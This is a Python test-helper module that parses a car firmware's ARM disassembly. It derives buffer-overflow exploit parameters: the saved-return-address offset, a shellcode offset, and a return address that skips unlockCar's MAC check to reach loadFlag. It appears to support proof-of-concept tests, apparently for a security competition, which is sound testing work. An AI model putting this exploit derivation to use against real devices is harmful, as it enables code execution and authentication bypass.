"""
Static ELF-analysis helpers shared by the buffer-overflow-to-RCE tests
(test_stack_overflow_poc.py and, eventually, siblings covering other
receive_board_message() call sites - see test_overflow_derivation.py's
module docstring for the staged plan this supports).

Given a compiled firmware ELF, derive_lr_offset_static() parses a vulnerable
function's compiled prologue/epilogue to work out where an attacker-supplied
message_len needs to land, relative to the overflowed buffer, to control that
function's saved return address. See test_stack_overflow_poc.py's module
docstring for the full derivation background (push/sub/add prologue shape,
why the epilogue's `add sp,#N; pop {..,pc}` matters, etc.) - this module just
extracts that derivation so it isn't duplicated per call site.

MAX_MESSAGE_LEN mirrors messages.c's receive path:

    message->message_len = uart_readb(BOARD_UART);   // uint8_t, so 0-255
    uart_read(BOARD_UART, message->buffer, message->message_len);

However large a vulnerable buffer's frame turns out to be, an attacker can
never declare a length past 255 - so a saved-LR slot sitting past that is
provably unreachable for *controlled* RCE via this exact bug, regardless of
what the disassembly says. See OverflowOffsets.reachable.
"""

import re
import subprocess
from dataclasses import dataclass
from pathlib import Path

MAX_MESSAGE_LEN = 255  # uint8_t message_len - see application/source/messages.c


def arm_tool(name: str, *args: str, **kwargs) -> subprocess.CompletedProcess:
    """Run an arm-none-eabi-* binutils/gcc tool and return its completed process."""
    return subprocess.run(["arm-none-eabi-" + name, *args], capture_output=True, text=True, check=True, **kwargs)


def disasm_lines(elf: Path, func: str) -> list[str]:
    """Disassembly lines ('  addr:\\tbytes\\tmnemonic ...') for one function."""
    out = arm_tool("objdump", "-d", f"--disassemble={func}", str(elf)).stdout
    return [line for line in out.splitlines() if re.match(r"^\s*[0-9a-f]+:\t", line)]


@dataclass(frozen=True)
class OverflowOffsets:
    """Everything derived from one vulnerable function's compiled
    prologue/epilogue. lr_slot_offset and shellcode_offset are relative to
    the start of the overflowed buffer; epilogue_addr is an absolute flash
    address. sp_locals_delta = frame_size + pushed_bytes: the amount SP needs
    to be walked back by from the function's *entry* SP to reach the value
    its own `add sp, #frame_size` expects to start from - only relevant if
    something is going to force PC into the middle of the epilogue directly
    (skipping the `sub sp` that would normally have gotten SP there first),
    rather than letting the function return through it naturally."""
    lr_slot_offset: int
    shellcode_offset: int
    epilogue_addr: int
    sp_locals_delta: int

    @property
    def reachable(self) -> bool:
        """Whether a uint8_t message_len (0-255) can supply all 4 bytes of
        the saved-LR slot. False means this exact bug can crash the target
        (a partial overwrite still corrupts *some* of the LR bytes right up
        to the 255-byte wire limit) but can't be turned into controlled RCE
        via this receive call - see MAX_MESSAGE_LEN above."""
        return self.lr_slot_offset + 4 <= MAX_MESSAGE_LEN


def derive_lr_offset_static(elf: Path, func_name: str = "unlockCar") -> OverflowOffsets:
    """Parse func_name's compiled prologue/epilogue out of elf. Expects the
    shape documented in test_stack_overflow_poc.py's module docstring:

        push {..., lr}                 ; N registers, LR last
        sub  sp, #FRAME_SIZE
        add  rBUF, sp, #BUFFER_OFFSET  ; rBUF = &<overflowed local>
        ...
        add  sp, #FRAME_SIZE           ; epilogue, shared by every return path
        pop  {..., pc}                 ; LR (last pushed) popped directly into PC

    Fails loudly (via assert, with the offending disassembly line) if
    func_name's compiled shape doesn't match this - deliberately, rather than
    silently deriving nonsense offsets from a shape this logic doesn't
    actually understand.
    """
    lines = disasm_lines(elf, func_name)
    assert lines, (
        f"{func_name!r} produced no disassembly from {elf} - check the name is spelled "
        f"right and wasn't compiled out (e.g. by a #ifdef TEST_BUILD it lives inside)"
    )

    push_m = re.search(r"push\s*\{([^}]*)\}", lines[0])
    assert push_m and "lr" in push_m.group(1), (
        f"{func_name}'s 1st instruction is no longer 'push {{..., lr}}' "
        f"(got: {lines[0]!r}); derivation needs updating"
    )
    pushed_regs = [r.strip() for r in push_m.group(1).split(",")]

    sub_m = re.search(r"sub\s+sp,\s*#(\d+)", lines[1])
    assert sub_m, (
        f"{func_name}'s 2nd instruction is no longer 'sub sp, #N' "
        f"(got: {lines[1]!r}); derivation needs updating"
    )
    frame_size = int(sub_m.group(1))

    add_m = re.search(r"add\s+r\d+,\s*sp,\s*#(\d+)", lines[2])
    assert add_m, (
        f"{func_name}'s 3rd instruction is no longer 'add rX, sp, #N' "
        f"(got: {lines[2]!r}); derivation needs updating"
    )
    buffer_offset = int(add_m.group(1))

    epilogue_addr = None
    for i in range(len(lines) - 1):
        m1 = re.search(rf"add\s+sp,\s*#{frame_size}\b", lines[i])
        if not m1:
            continue
        m2 = re.search(r"pop\s*\{([^}]*)\}", lines[i + 1])
        if m2 and "pc" in m2.group(1):
            epilogue_addr = int(re.match(r"\s*([0-9a-f]+):", lines[i]).group(1), 16)
            break
    assert epilogue_addr is not None, (
        f"Couldn't find {func_name}'s 'add sp, #{frame_size}' / 'pop {{..., pc}}' "
        f"epilogue; derivation needs updating"
    )

    pushed_bytes = len(pushed_regs) * 4
    lr_slot_offset = frame_size + pushed_bytes - 4 - buffer_offset
    shellcode_offset = lr_slot_offset + 4
    sp_locals_delta = frame_size + pushed_bytes
    return OverflowOffsets(lr_slot_offset, shellcode_offset, epilogue_addr, sp_locals_delta)


# ============================================================================
# Return-into-existing-code target (see test_overflow_derivation.py's Stage 3
# notes): the flash address to forge the saved LR to when the goal is to
# re-enter an existing, already-correct code path - e.g. the loadFlag()/
# uart_write() block guarded by unlockCar()'s MAC check - rather than inject
# and jump to fresh shellcode. Needs no live SP, no shellcode, and (per
# derive_lr_offset_static's own docstring) survives the natural
# `pop {..., pc}` return path unmodified.
# ============================================================================

def derive_reentry_addr(elf: Path, func_name: str, callee_name: str) -> int:
    """Find the address to redirect execution into to skip whatever check(s)
    guard entry to a `callee_name` call inside `func_name`, landing at the
    very start of the straight-line block that calls it - without needing
    debug info (car.c has none in a plain, non-debug=True build - see
    SConstruct:149-150 - so this can't use addr2line/source-line lookup).

    Locates the first `bl <callee_name>` in func_name's disassembly, then
    walks backward to the nearest preceding branch instruction (any of
    b/beq/bne/bls/bhi/ble/bgt/blt/bge/cbnz/cbz - deliberately not bl/blx,
    which return to the next instruction rather than guarding fall-through
    the same way), and returns the address of the instruction right after
    that branch: the entry point of whichever basic block the call sits in,
    reachable identically whether the compiler placed it as a fall-through
    or an explicit jump target.

    This is a pattern-matched STATIC guess, not a proof - only a real
    breakpoint hit during genuine, unmodified execution actually confirms it
    (see test_reentry_addr_hit_during_normal_unlock). Fails loudly if
    func_name's disassembly doesn't contain the expected shape, rather than
    silently returning a wrong address.
    """
    lines = disasm_lines(elf, func_name)
    assert lines, (
        f"{func_name!r} produced no disassembly from {elf} - check the name is spelled "
        f"right and wasn't compiled out (e.g. by a #ifdef TEST_BUILD it lives inside)"
    )

    call_re = re.compile(rf"\bbl\s+[0-9a-f]+\s*<{re.escape(callee_name)}>")
    branch_re = re.compile(
        r"\b(?:b|beq|bne|bls|bhi|ble|bgt|blt|bge|cbnz|cbz)(?:\.n|\.w)?\s+(?:r\d+,\s*)?[0-9a-f]+\s*<"
    )

    call_idx = next((i for i, line in enumerate(lines) if call_re.search(line)), None)
    assert call_idx is not None, (
        f"No 'bl <{callee_name}>' found in {func_name}'s disassembly - either it isn't called "
        f"there in this build (e.g. TEST_BUILD strips the call site entirely - see car.c's "
        f"#ifndef TEST_BUILD block) or callee_name is wrong"
    )

    branch_idx = next((i for i in range(call_idx - 1, -1, -1) if branch_re.search(lines[i])), None)
    assert branch_idx is not None, (
        f"No branch instruction found before the 'bl <{callee_name}>' call in {func_name} - "
        f"can't identify a guarded block entry point; derivation needs updating"
    )

    return int(re.match(r"\s*([0-9a-f]+):", lines[branch_idx + 1]).group(1), 16)
